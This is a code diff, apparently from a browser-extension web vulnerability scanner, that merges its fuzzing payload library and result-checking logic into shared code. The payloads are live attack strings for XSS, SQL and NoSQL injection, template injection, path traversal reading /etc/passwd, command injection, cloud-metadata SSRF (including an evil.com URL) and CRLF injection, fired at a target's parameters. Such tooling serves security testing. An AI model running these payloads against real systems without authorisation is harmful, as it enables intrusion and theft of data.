@@ -9,6 +9,211 @@ const capturedRequests = {};
 // Structure: { 'target.com': { hosts: Set, jsFiles: Map<url, {firstSeen, status, ct, size}>, requests: [], authDetectedAt: timestamp|null } }
 const domainAggregate = {};
 
+// ═══ SHARED FUZZER PAYLOAD LIBRARY ═══
+// Single source of truth used by both PARAM_FUZZ (URL params) and FUZZ_FORM (form fields).
+// The previous code duplicated a tiny subset client-side; that subset silently fell back
+// to XSS payloads for any category it didn't know, which made every Proto/NoSQL/Cmd/SSRF/CRLF
+// click on form-mode actually fire XSS payloads. Now both code paths look up here.
+const FUZZ_PAYLOADS = {
+  xss: [
+    { p: '<script>alert(1)</script>', check: 'unencoded_html' },
+    { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
+    { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
+    { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
+    { p: '<svg\tonload=alert(1)>', check: 'unencoded_html' },
+    { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
+    { p: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', check: 'unencoded_html' },
+    { p: '%253Csvg%2520onload%253Dalert(1)%253E', check: 'reflected' },
+    { p: 'javascript:alert(1)//', check: 'reflected' },
+    { p: '<svg onload=\u0061lert(1)>', check: 'unencoded_html' },
+  ],
+  sqli: [
+    { p: "' OR '1'='1", check: 'sqli_error' },
+    { p: "1' AND '1'='1", check: 'sqli_error' },
+    { p: "' UNION SELECT NULL--", check: 'sqli_error' },
+    { p: "1; DROP TABLE--", check: 'sqli_error' },
+    { p: "1'/*!50000OR*/'1'='1", check: 'sqli_error' },
+    { p: "' uNiOn SeLeCt NULL--", check: 'sqli_error' },
+    { p: "%27%20OR%201%3D1--", check: 'sqli_error' },
+    { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
+    { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
+    { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
+    { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
+    { p: "1; SELECT SLEEP(4)--", check: 'sqli_blind_time' },
+  ],
+  nosqli: [
+    { p: '{"$ne":null}', check: 'nosqli' },
+    { p: '{"$gt":""}', check: 'nosqli' },
+    { p: "[$ne]=null", check: 'nosqli' },
+    { p: "[$gt]=", check: 'nosqli' },
+    { p: '{"$where":"sleep(4000)"}', check: 'sqli_blind_time' },
+    { p: "';return 'a'=='a' && '", check: 'nosqli' },
+  ],
+  ssti: [
+    { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925920740741' },
+    { p: '${9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
+    { p: '<%= 8372615*7 %>', check: 'ssti_eval', expect: '58608305' },
+    { p: '#{6192837+4}', check: 'ssti_eval', expect: '6192841' },
+    { p: '{{config.__class__.__init__.__globals__}}', check: 'reflected' },
+    { p: '{{_self.env.display("id")}}', check: 'reflected' },
+  ],
+  path: [
+    { p: '../../../etc/passwd', check: 'file_content' },
+    { p: '....//....//etc/passwd', check: 'file_content' },
+    { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
+    { p: '../../../etc/passwd%00', check: 'file_content' },
+    { p: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', check: 'file_content' },
+    { p: '%252e%252e/%252e%252e/etc/passwd', check: 'file_content' },
+  ],
+  cmdi: [
+    { p: ';id', check: 'cmdi' },
+    { p: '|id', check: 'cmdi' },
+    { p: '||id', check: 'cmdi' },
+    { p: '`id`', check: 'cmdi' },
+    { p: '$(id)', check: 'cmdi' },
+    { p: ';cat /etc/passwd', check: 'file_content' },
+    { p: ';sleep 4', check: 'sqli_blind_time' },
+    { p: '`sleep 4`', check: 'sqli_blind_time' },
+  ],
+  ssrf: [
+    { p: 'http://169.254.169.254/latest/meta-data/', check: 'ssrf_aws' },
+    { p: 'http://metadata.google.internal/computeMetadata/v1/', check: 'ssrf_gcp' },
+    { p: 'http://localhost', check: 'ssrf_internal' },
+    { p: 'http://127.0.0.1', check: 'ssrf_internal' },
+    { p: 'http://[::1]', check: 'ssrf_internal' },
+    { p: 'file:///etc/passwd', check: 'file_content' },
+    { p: 'gopher://127.0.0.1:6379/_INFO', check: 'reflected' },
+    { p: 'http://169.254.169.254@evil.com', check: 'reflected' },
+  ],
+  proto: [
+    { p: '__proto__[admin]=true', check: 'reflected' },
+    { p: 'constructor[prototype][admin]=true', check: 'reflected' },
+    { p: '__proto__.polluted=true', check: 'reflected' },
+  ],
+  crlf: [
+    { p: '%0d%0aSet-Cookie:cybo=1', check: 'crlf' },
+    { p: '%0d%0aX-Cybo-Header:1', check: 'crlf' },
+    { p: '%0a%0d%0a%0d<script>alert(1)</script>', check: 'crlf' },
+  ],
+};
+
+const FUZZ_SIGNATURES = {
+  sqliErrors: ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'],
+  nosqlErrors: ['mongoerror', 'mongoose', 'cast to objectid', 'unknown operator', 'cannot apply $', 'badvalue:', 'syntax error in expression'],
+  cmdiSignatures: ['uid=', 'gid=', 'groups=', 'root:x:', '/bin/bash', '/bin/sh', 'daemon:x:', 'www-data', 'volume serial number is'],
+  ssrfAwsSig: ['ami-id', 'instance-id', 'iam/', 'security-credentials', 'placement/', 'public-keys/'],
+  ssrfGcpSig: ['/computeMetadata/v1/', 'instance/service-accounts/', 'metadata-flavor: google'],
+  ssrfInternalSig: ['phpmyadmin', 'redis_version:', 'jenkins', 'spring-boot', 'kibana', '<title>nginx', 'apache/', 'localhost', '127.0.0.1'],
+};
+
+// Single source of truth for the per-payload verification logic. Both URL-fuzz and form-fuzz
+// call this so the rules don't drift between the two paths.
+function evaluateFuzzResult({ check, payload, expect, body, baselineBody, baselineLen, elapsed, baselineTime, status, headers, rawReflected, context }) {
+  const sig = FUZZ_SIGNATURES;
+  let severity = 'safe', analysis = '', outContext = context || '';
+
+  if (check === 'unencoded_html') {
+    const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
+    if (rawReflected && !htmlEncoded) {
+      const inScript = /<script[^>]*>[^<]*$/i.test(body.slice(0, body.indexOf(payload)));
+      if (inScript) { severity = 'high'; analysis = 'Payload reflected UNENCODED inside <script> — XSS!'; }
+      else { severity = 'high'; analysis = 'Payload reflected UNENCODED in HTML body — likely XSS!'; }
+    } else if (htmlEncoded) { severity = 'safe'; analysis = 'Reflected but HTML-encoded (safe)'; }
+    else { severity = 'safe'; analysis = 'Not reflected'; }
+  } else if (check === 'unencoded_attr') {
+    if (rawReflected && outContext.includes('"') && !body.includes(payload.replace(/"/g, '&quot;'))) {
+      severity = 'high'; analysis = 'Quote character reflected unencoded — attribute breakout possible';
+    } else { severity = rawReflected ? 'low' : 'safe'; analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected'; }
+  } else if (check === 'ssti_eval') {
+    const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
+    const evalMatch = evalRegex.exec(body);
+    if (evalMatch && !rawReflected) {
+      const surrounding = body.slice(Math.max(0, evalMatch.index - 40), Math.min(body.length, evalMatch.index + expect.length + 40));
+      const inHex = /[0-9a-f]{12,}/i.test(surrounding);
+      const inHash = /sha|hash|key|token|id.*=.*[0-9a-f]/i.test(surrounding);
+      const inBaseline = baselineBody && baselineBody.includes(expect);
+      if (inHex || inHash || inBaseline) { severity = 'safe'; analysis = inBaseline ? 'Number already present in baseline response — false positive' : 'Number found but inside hex/hash/ID string — false positive'; }
+      else { severity = 'high'; analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect + '!'; outContext = surrounding; }
+    } else if (rawReflected) { severity = 'safe'; analysis = 'Literal syntax echoed back (not evaluated) — no template engine processed it'; }
+    else { severity = 'safe'; analysis = 'Not reflected, not evaluated'; }
+  } else if (check === 'sqli_error') {
+    const bodyLower = body.toLowerCase();
+    const errorFound = sig.sqliErrors.find(e => bodyLower.includes(e));
+    const lenDiff = Math.abs(body.length - baselineLen);
+    const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
+    if (errorFound && !errorInBaseline) {
+      severity = 'high'; analysis = 'SQL error detected: "' + errorFound + '"';
+      const errIdx = bodyLower.indexOf(errorFound);
+      outContext = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
+    } else if (errorFound && errorInBaseline) { severity = 'safe'; analysis = 'SQL-related text found but also present in baseline — likely page content, not injection'; }
+    else if (status === 500 && baselineLen > 0 && body !== baselineBody) { severity = 'medium'; analysis = 'Server error (500) on payload — possible SQL injection'; }
+    else if (lenDiff > 5000) { severity = 'low'; analysis = 'Significant response size change (' + lenDiff + ' bytes) — investigate'; }
+    else { severity = 'safe'; analysis = 'No SQL errors detected'; }
+  } else if (check === 'sqli_blind_time') {
+    const timeDiff = elapsed - baselineTime;
+    if (timeDiff > 3000) { severity = 'high'; analysis = 'Response delayed ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — TIME-BASED BLIND SQLi!'; }
+    else if (timeDiff > 1500) { severity = 'medium'; analysis = 'Slight delay ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — investigate'; }
+    else { severity = 'safe'; analysis = 'No delay (' + (elapsed/1000).toFixed(1) + 's)'; }
+  } else if (check === 'file_content' || check === 'file_content_win') {
+    const fileIndicators = check === 'file_content'
+      ? ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:']
+      : ['[extensions]', '[fonts]', '[mci extensions]'];
+    const found = fileIndicators.find(f => body.includes(f));
+    if (found) {
+      severity = 'high'; analysis = 'File content detected: "' + found + '" — path traversal confirmed!';
+      const fIdx = body.indexOf(found);
+      outContext = body.slice(Math.max(0, fIdx - 20), Math.min(body.length, fIdx + 100));
+    } else if (rawReflected) { severity = 'safe'; analysis = 'Path reflected in page (e.g. search query) but no file content — false positive'; }
+    else { severity = 'safe'; analysis = 'Not reflected, no file content'; }
+  } else if (check === 'nosqli') {
+    const bodyLower = body.toLowerCase();
+    const errFound = sig.nosqlErrors.find(e => bodyLower.includes(e));
+    const errInBaseline = errFound && baselineBody.toLowerCase().includes(errFound);
+    const lenChange = Math.abs(body.length - baselineLen);
+    if (errFound && !errInBaseline) {
+      severity = 'high'; analysis = 'NoSQL error: "' + errFound + '"';
+      const idx = bodyLower.indexOf(errFound);
+      outContext = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + errFound.length + 80));
+    } else if (lenChange > 5000 && status === 200) { severity = 'medium'; analysis = 'Response length changed by ' + lenChange + ' bytes (auth bypass via NoSQL operator possible) — compare manually'; }
+    else { severity = 'safe'; analysis = 'No NoSQL evidence detected'; }
+  } else if (check === 'cmdi') {
+    const found = sig.cmdiSignatures.find(s => body.includes(s) && !baselineBody.includes(s));
+    if (found) {
+      severity = 'high'; analysis = 'Command output signature "' + found + '" — command injection confirmed!';
+      const idx = body.indexOf(found);
+      outContext = body.slice(Math.max(0, idx - 30), Math.min(body.length, idx + 150));
+    } else { severity = 'safe'; analysis = 'No command output detected'; }
+  } else if (check === 'ssrf_aws') {
+    const found = sig.ssrfAwsSig.find(s => body.includes(s));
+    if (found) { severity = 'high'; analysis = 'AWS metadata reached: "' + found + '" — SSRF to instance metadata!'; outContext = body.slice(0, 300); }
+    else if (body.length > 100 && body.length !== baselineLen) { severity = 'medium'; analysis = 'Response differs from baseline — possible SSRF, verify manually'; }
+    else { severity = 'safe'; analysis = 'No metadata signature'; }
+  } else if (check === 'ssrf_gcp') {
+    const found = sig.ssrfGcpSig.find(s => body.toLowerCase().includes(s.toLowerCase()));
+    if (found) { severity = 'high'; analysis = 'GCP metadata signal: "' + found + '" — SSRF possible'; outContext = body.slice(0, 300); }
+    else { severity = 'safe'; analysis = 'No GCP metadata signal'; }
+  } else if (check === 'ssrf_internal') {
+    const found = sig.ssrfInternalSig.find(s => body.toLowerCase().includes(s));
+    if (found && !baselineBody.toLowerCase().includes(found)) {
+      severity = 'medium'; analysis = 'Internal-service signature "' + found + '" appeared (not in baseline) — possible SSRF';
+      const idx = body.toLowerCase().indexOf(found);
+      outContext = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + 200));
+    } else { severity = 'safe'; analysis = 'No internal-service signal'; }
+  } else if (check === 'crlf') {
+    const setCookieReflected = headers && headers.get('set-cookie')?.includes('cybo=1');
+    const customReflected = headers && headers.get('x-cybo-header');
+    if (setCookieReflected || customReflected) {
+      severity = 'high'; analysis = 'CRLF injected into response headers — header injection confirmed!';
+      outContext = 'set-cookie: ' + (headers.get('set-cookie') || '') + '\nx-cybo-header: ' + (customReflected || '');
+    } else { severity = 'safe'; analysis = 'No CRLF reflection in response headers'; }
+  } else {
+    // 'reflected' or unknown — generic reflection check
+    severity = rawReflected ? 'low' : 'safe';
+    analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
+  }
+  return { severity, analysis, context: outContext };
+}
+
 // Helper: extract eTLD+1 from any hostname
 function getRootDomain(hostname) {
   if (!hostname) return '';
@@ -590,119 +795,20 @@ const handlers = {
 
   // ═══ PARAMETER FUZZER — Enhanced SSTI numbers, baseline comparison ═══
   PARAM_FUZZ: async (msg, _, sr) => {
-    const payloads = {
-      xss: [
-        { p: '<script>alert(1)</script>', check: 'unencoded_html' },
-        { p: '"><img src=x onerror=alert(1)>', check: 'unencoded_html' },
-        { p: '<svg/onload=alert(1)>', check: 'unencoded_html' },
-        { p: 'cyboXSS"onmouseover="alert(1)', check: 'unencoded_attr' },
-        { p: '<svg\tonload=alert(1)>', check: 'unencoded_html' },
-        { p: '<details open ontoggle=alert(1)>', check: 'unencoded_html' },
-        { p: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>', check: 'unencoded_html' },
-        { p: '%253Csvg%2520onload%253Dalert(1)%253E', check: 'reflected' },
-        { p: 'javascript:alert(1)//', check: 'reflected' },
-        { p: '<svg onload=\u0061lert(1)>', check: 'unencoded_html' },
-      ],
-      sqli: [
-        { p: "' OR '1'='1", check: 'sqli_error' },
-        { p: "1' AND '1'='1", check: 'sqli_error' },
-        { p: "' UNION SELECT NULL--", check: 'sqli_error' },
-        { p: "1; DROP TABLE--", check: 'sqli_error' },
-        { p: "1'/*!50000OR*/'1'='1", check: 'sqli_error' },
-        { p: "' uNiOn SeLeCt NULL--", check: 'sqli_error' },
-        { p: "%27%20OR%201%3D1--", check: 'sqli_error' },
-        { p: "' AND extractvalue(1,concat(0x7e,version()))--", check: 'sqli_error' },
-        // Time-based blind SQLi
-        { p: "' OR SLEEP(4)--", check: 'sqli_blind_time' },
-        { p: "'; WAITFOR DELAY '0:0:4'--", check: 'sqli_blind_time' },
-        { p: "' || pg_sleep(4)--", check: 'sqli_blind_time' },
-        { p: "1; SELECT SLEEP(4)--", check: 'sqli_blind_time' },
-      ],
-      // NoSQL injection — MongoDB / Mongoose. Operator-style and bracket-style.
-      nosqli: [
-        { p: '{"$ne":null}', check: 'nosqli' },
-        { p: '{"$gt":""}', check: 'nosqli' },
-        { p: "[$ne]=null", check: 'nosqli' },
-        { p: "[$gt]=", check: 'nosqli' },
-        { p: '{"$where":"sleep(4000)"}', check: 'sqli_blind_time' },
-        { p: "';return 'a'=='a' && '", check: 'nosqli' },
-      ],
-      ssti: [
-        { p: '{{7777777*3333333}}', check: 'ssti_eval', expect: '25925920740741' },
-        { p: '${9182736+4455667}', check: 'ssti_eval', expect: '13638403' },
-        { p: '<%= 8372615*7 %>', check: 'ssti_eval', expect: '58608305' },
-        { p: '#{6192837+4}', check: 'ssti_eval', expect: '6192841' },
-        { p: '{{config.__class__.__init__.__globals__}}', check: 'reflected' },
-        { p: '{{_self.env.display("id")}}', check: 'reflected' },
-      ],
-      path: [
-        { p: '../../../etc/passwd', check: 'file_content' },
-        { p: '....//....//etc/passwd', check: 'file_content' },
-        { p: '..\\..\\..\\windows\\win.ini', check: 'file_content_win' },
-        { p: '../../../etc/passwd%00', check: 'file_content' },
-        { p: '%2e%2e/%2e%2e/%2e%2e/etc/passwd', check: 'file_content' },
-        { p: '%252e%252e/%252e%252e/etc/passwd', check: 'file_content' },
-      ],
-      // Command injection — looks for command-output indicators (uid=, root:x:, /bin/bash) in response
-      cmdi: [
-        { p: ';id', check: 'cmdi' },
-        { p: '|id', check: 'cmdi' },
-        { p: '||id', check: 'cmdi' },
-        { p: '`id`', check: 'cmdi' },
-        { p: '$(id)', check: 'cmdi' },
-        { p: ';cat /etc/passwd', check: 'file_content' },
-        // Time-based — useful when output is suppressed
-        { p: ';sleep 4', check: 'sqli_blind_time' },
-        { p: '`sleep 4`', check: 'sqli_blind_time' },
-      ],
-      // SSRF — looks for cloud-metadata signatures or internal-only response patterns
-      ssrf: [
-        { p: 'http://169.254.169.254/latest/meta-data/', check: 'ssrf_aws' },
-        { p: 'http://metadata.google.internal/computeMetadata/v1/', check: 'ssrf_gcp' },
-        { p: 'http://localhost', check: 'ssrf_internal' },
-        { p: 'http://127.0.0.1', check: 'ssrf_internal' },
-        { p: 'http://[::1]', check: 'ssrf_internal' },
-        { p: 'file:///etc/passwd', check: 'file_content' },
-        { p: 'gopher://127.0.0.1:6379/_INFO', check: 'reflected' },
-        { p: 'http://169.254.169.254@evil.com', check: 'reflected' },
-      ],
-      // Prototype pollution
-      proto: [
-        { p: '__proto__[admin]=true', check: 'reflected' },
-        { p: 'constructor[prototype][admin]=true', check: 'reflected' },
-        { p: '__proto__.polluted=true', check: 'reflected' },
-      ],
-      // CRLF injection
-      crlf: [
-        { p: '%0d%0aSet-Cookie:cybo=1', check: 'crlf' },
-        { p: '%0d%0aX-Cybo-Header:1', check: 'crlf' },
-        { p: '%0a%0d%0a%0d<script>alert(1)</script>', check: 'crlf' },
-      ],
-    };
-
-    const sqliErrors = ['sql syntax', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error', 'unclosed quotation', 'unterminated string', 'SQLSTATE', 'microsoft sql', 'odbc', 'jdbc', 'quoted string not properly terminated'];
-    const nosqlErrors = ['mongoerror', 'mongoose', 'cast to objectid', 'unknown operator', 'cannot apply $', 'badvalue:', 'syntax error in expression'];
-    const cmdiSignatures = ['uid=', 'gid=', 'groups=', 'root:x:', '/bin/bash', '/bin/sh', 'daemon:x:', 'www-data', 'volume serial number is'];
-    const ssrfAwsSig = ['ami-id', 'instance-id', 'iam/', 'security-credentials', 'placement/', 'public-keys/'];
-    const ssrfGcpSig = ['/computeMetadata/v1/', 'instance/service-accounts/', 'metadata-flavor: google'];
-    const ssrfInternalSig = ['phpmyadmin', 'redis_version:', 'jenkins', 'spring-boot', 'kibana', '<title>nginx', 'apache/', 'localhost', '127.0.0.1'];
-
     try {
-      const results = [];
       const baseUrl = new URL(msg.url);
       const params = [...baseUrl.searchParams.keys()];
       if (!params.length) { sr({ ok: true, results: [], params: [], message: 'No URL parameters found. Add ?param=value to test.' }); return; }
 
       const category = msg.category || 'xss';
-      const testPayloads = [...(payloads[category] || payloads.xss)];
+      // Use the shared payload library — same source of truth as form-mode.
+      const testPayloads = [...(FUZZ_PAYLOADS[category] || FUZZ_PAYLOADS.xss)];
       if (msg.customPayloads && msg.customPayloads.length) {
         msg.customPayloads.forEach(cp => testPayloads.push({ p: cp, check: 'reflected' }));
       }
 
       // Baseline timing
-      let baselineLen = 0;
-      let baselineBody = '';
-      let baselineTime = 0;
+      let baselineLen = 0, baselineBody = '', baselineTime = 0;
       try {
         const t0 = Date.now();
         const br = await fetch(msg.url, { credentials: 'include', signal: AbortSignal.timeout(10000) });
@@ -711,12 +817,12 @@ const handlers = {
         baselineLen = baselineBody.length;
       } catch {}
 
-      // Enhanced: test all payloads, not just first 4
       const maxPayloads = msg.maxPayloads || testPayloads.length;
       const maxParams = msg.maxParams || Math.min(params.length, 8);
       const selectedParams = msg.selectedParams || null;
-
       const targetParams = selectedParams ? params.filter(p => selectedParams.includes(p)) : params.slice(0, maxParams);
+
+      const results = [];
       for (const param of targetParams) {
         for (const { p: payload, check, expect } of testPayloads.slice(0, maxPayloads)) {
           const testUrl = new URL(msg.url);
@@ -728,192 +834,31 @@ const handlers = {
             const elapsed = Date.now() - t0;
             const body = await r.text();
             const rawReflected = body.includes(payload);
-
             let context = '';
             if (rawReflected) {
               const idx = body.indexOf(payload);
-              const start = Math.max(0, idx - 80);
-              const end = Math.min(body.length, idx + payload.length + 80);
-              context = body.slice(start, end);
+              context = body.slice(Math.max(0, idx - 80), Math.min(body.length, idx + payload.length + 80));
             }
-
-            let severity = 'safe';
-            let analysis = '';
-
-            if (check === 'unencoded_html') {
-              const htmlEncoded = body.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'));
-              if (rawReflected && !htmlEncoded) {
-                const inTitle = context.includes('<title') && context.includes('</title');
-                const inMeta = context.includes('<meta');
-                const inComment = context.includes('<!--');
-                if (inTitle || inMeta || inComment) {
-                  severity = 'low';
-                  analysis = 'Reflected unencoded but inside safe context (' + (inTitle?'title':inMeta?'meta':'comment') + ')';
-                } else {
-                  severity = 'high';
-                  analysis = 'Payload reflected UNENCODED in HTML body — likely XSS!';
-                }
-              } else if (htmlEncoded) {
-                severity = 'safe';
-                analysis = 'Reflected but HTML-encoded (safe)';
-              } else {
-                severity = 'safe';
-                analysis = 'Not reflected';
-              }
-            } else if (check === 'unencoded_attr') {
-              if (rawReflected && context.includes('"') && !body.includes(payload.replace(/"/g, '&quot;'))) {
-                severity = 'high';
-                analysis = 'Quote character reflected unencoded — attribute breakout possible';
-              } else {
-                severity = rawReflected ? 'low' : 'safe';
-                analysis = rawReflected ? 'Reflected but quotes encoded' : 'Not reflected';
-              }
-            } else if (check === 'ssti_eval') {
-              // Enhanced: larger numbers = far fewer false positives
-              const evalRegex = new RegExp('(?<![0-9a-fA-F])' + expect + '(?![0-9a-fA-F])');
-              const evalMatch = evalRegex.exec(body);
-              if (evalMatch && !rawReflected) {
-                const matchIdx = evalMatch.index;
-                const surrounding = body.slice(Math.max(0, matchIdx - 40), Math.min(body.length, matchIdx + expect.length + 40));
-                const inHex = /[0-9a-f]{12,}/i.test(surrounding);
-                const inHash = /sha|hash|key|token|id.*=.*[0-9a-f]/i.test(surrounding);
-                // Also check if number existed in baseline
-                const inBaseline = baselineBody.includes(expect);
-                if (inHex || inHash || inBaseline) {
-                  severity = 'safe';
-                  analysis = inBaseline ? 'Number already present in baseline response — false positive' : 'Number found but inside hex/hash/ID string — false positive';
-                } else {
-                  severity = 'high';
-                  analysis = 'Template expression EVALUATED — ' + payload + ' = ' + expect + '!';
-                  context = surrounding;
-                }
-              } else if (rawReflected) {
-                severity = 'safe';
-                analysis = 'Literal syntax echoed back (not evaluated) — no template engine processed it';
-              } else {
-                severity = 'safe';
-                analysis = 'Not reflected, not evaluated';
-              }
-            } else if (check === 'sqli_error') {
-              const bodyLower = body.toLowerCase();
-              const errorFound = sqliErrors.find(e => bodyLower.includes(e));
-              const lenDiff = Math.abs(body.length - baselineLen);
-              // Enhanced: check if the error already existed in baseline
-              const errorInBaseline = errorFound && baselineBody.toLowerCase().includes(errorFound);
-              if (errorFound && !errorInBaseline) {
-                severity = 'high';
-                analysis = 'SQL error detected: "' + errorFound + '"';
-                const errIdx = bodyLower.indexOf(errorFound);
-                context = body.slice(Math.max(0, errIdx - 40), Math.min(body.length, errIdx + errorFound.length + 80));
-              } else if (errorFound && errorInBaseline) {
-                severity = 'safe';
-                analysis = 'SQL-related text found but also present in baseline — likely page content, not injection';
-              } else if (r.status === 500 && baselineLen > 0 && body !== baselineBody) {
-                severity = 'medium';
-                analysis = 'Server error (500) on payload — possible SQL injection';
-              } else if (lenDiff > 5000) {
-                severity = 'low';
-                analysis = 'Significant response size change (' + lenDiff + ' bytes) — investigate';
-              } else {
-                severity = 'safe';
-                analysis = 'No SQL errors detected';
-              }
-            } else if (check === 'sqli_blind_time') {
-              const timeDiff = elapsed - baselineTime;
-              if (timeDiff > 3000) {
-                severity = 'high';
-                analysis = 'Response delayed ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — TIME-BASED BLIND SQLi!';
-              } else if (timeDiff > 1500) {
-                severity = 'medium';
-                analysis = 'Slight delay ' + (elapsed/1000).toFixed(1) + 's (baseline ' + (baselineTime/1000).toFixed(1) + 's) — investigate';
-              } else {
-                severity = 'safe';
-                analysis = 'No delay (' + (elapsed/1000).toFixed(1) + 's)';
-              }
-            } else if (check === 'file_content' || check === 'file_content_win') {
-              const fileIndicators = check === 'file_content'
-                ? ['root:', '/bin/bash', '/bin/sh', 'daemon:', 'nobody:']
-                : ['[extensions]', '[fonts]', '[mci extensions]'];
-              const found = fileIndicators.find(f => body.includes(f));
-              if (found) {
-                severity = 'high';
-                analysis = 'File content detected: "' + found + '" — path traversal confirmed!';
-                const fIdx = body.indexOf(found);
-                context = body.slice(Math.max(0, fIdx - 20), Math.min(body.length, fIdx + 100));
-              } else if (rawReflected) {
-                severity = 'safe';
-                analysis = 'Path reflected in page (e.g. search query) but no file content — false positive';
-              } else {
-                severity = 'safe';
-                analysis = 'Not reflected, no file content';
-              }
-            } else if (check === 'nosqli') {
-              const bodyLower = body.toLowerCase();
-              const errFound = nosqlErrors.find(e => bodyLower.includes(e));
-              const errInBaseline = errFound && baselineBody.toLowerCase().includes(errFound);
-              const lenChange = Math.abs(body.length - baselineLen);
-              if (errFound && !errInBaseline) {
-                severity = 'high';
-                analysis = 'NoSQL error: "' + errFound + '"';
-                const idx = bodyLower.indexOf(errFound);
-                context = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + errFound.length + 80));
-              } else if (lenChange > 5000 && r.status === 200) {
-                severity = 'medium';
-                analysis = 'Response length changed by ' + lenChange + ' bytes (auth bypass via NoSQL operator possible) — compare manually';
-              } else {
-                severity = 'safe';
-                analysis = 'No NoSQL evidence detected';
-              }
-            } else if (check === 'cmdi') {
-              const found = cmdiSignatures.find(s => body.includes(s) && !baselineBody.includes(s));
-              if (found) {
-                severity = 'high';
-                analysis = 'Command output signature "' + found + '" — command injection confirmed!';
-                const idx = body.indexOf(found);
-                context = body.slice(Math.max(0, idx - 30), Math.min(body.length, idx + 150));
-              } else {
-                severity = 'safe';
-                analysis = 'No command output detected';
-              }
-            } else if (check === 'ssrf_aws') {
-              const found = ssrfAwsSig.find(s => body.includes(s));
-              if (found) { severity = 'high'; analysis = 'AWS metadata reached: "' + found + '" — SSRF to instance metadata!'; context = body.slice(0, 300); }
-              else if (body.length > 100 && body.length !== baselineLen) { severity = 'medium'; analysis = 'Response differs from baseline — possible SSRF, verify manually'; }
-              else { severity = 'safe'; analysis = 'No metadata signature'; }
-            } else if (check === 'ssrf_gcp') {
-              const found = ssrfGcpSig.find(s => body.toLowerCase().includes(s.toLowerCase()));
-              if (found) { severity = 'high'; analysis = 'GCP metadata signal: "' + found + '" — SSRF possible'; context = body.slice(0, 300); }
-              else { severity = 'safe'; analysis = 'No GCP metadata signal'; }
-            } else if (check === 'ssrf_internal') {
-              const found = ssrfInternalSig.find(s => body.toLowerCase().includes(s));
-              if (found && !baselineBody.toLowerCase().includes(found)) {
-                severity = 'medium';
-                analysis = 'Internal-service signature "' + found + '" appeared (not in baseline) — possible SSRF';
-                const idx = body.toLowerCase().indexOf(found);
-                context = body.slice(Math.max(0, idx - 40), Math.min(body.length, idx + 200));
-              } else { severity = 'safe'; analysis = 'No internal-service signal'; }
-            } else if (check === 'crlf') {
-              // Reflected response headers — only visible if server processes the CRLF
-              const setCookieReflected = r.headers.get('set-cookie')?.includes('cybo=1');
-              const customReflected = r.headers.get('x-cybo-header');
-              if (setCookieReflected || customReflected) {
-                severity = 'high';
-                analysis = 'CRLF injected into response headers — header injection confirmed!';
-                context = 'set-cookie: ' + (r.headers.get('set-cookie') || '') + '\nx-cybo-header: ' + (customReflected || '');
-              } else {
-                severity = 'safe';
-                analysis = 'No CRLF reflection in response headers';
-              }
-            } else {
-              severity = rawReflected ? 'low' : 'safe';
-              analysis = rawReflected ? 'Reflected (manual review needed)' : 'Not reflected';
-            }
-
+            const ev = evaluateFuzzResult({
+              check, payload, expect, body, baselineBody, baselineLen,
+              elapsed, baselineTime, status: r.status, headers: r.headers,
+              rawReflected, context,
+            });
             let errorBody = '';
-            if (r.status >= 500 && body.length < 5000) {
-              errorBody = body.slice(0, 500);
-            }
-            results.push({ param, payload, severity, analysis, status: r.status, bodyLen: body.length, elapsed, context: severity !== 'safe' ? context : '', url: testUrl.toString(), errorBody, responsePreview: body.slice(0, 600) });
+            if (r.status >= 500 && body.length < 5000) errorBody = body.slice(0, 500);
+            results.push({
+              param, payload,
+              severity: ev.severity, analysis: ev.analysis,
+              status: r.status, bodyLen: body.length, elapsed,
+              context: ev.severity !== 'safe' ? ev.context : '',
+              url: testUrl.toString(), errorBody,
+              // Preview shown inline (truncated for the panel) AND full body for "Copy Response".
+              // Cap full body at 1MB to avoid blowing up message-passing on giant responses.
+              responsePreview: body.slice(0, 600),
+              responseFull: body.length > 1_000_000 ? body.slice(0, 1_000_000) : body,
+              responseTruncated: body.length > 1_000_000,
+              responseTotalLen: body.length,
+            });
           } catch (e) {
             results.push({ param, payload, severity: 'info', analysis: 'Request failed: ' + e.message, error: e.message });
           }
@@ -1527,8 +1472,15 @@ const handlers = {
 
   // ═══ FORM FIELD FUZZER — POST/GET form submission with payloads ═══
   FUZZ_FORM: async (msg, _, sr) => {
-    const { action, method, fields, payloads, category, selectedFields, frozenFields } = msg;
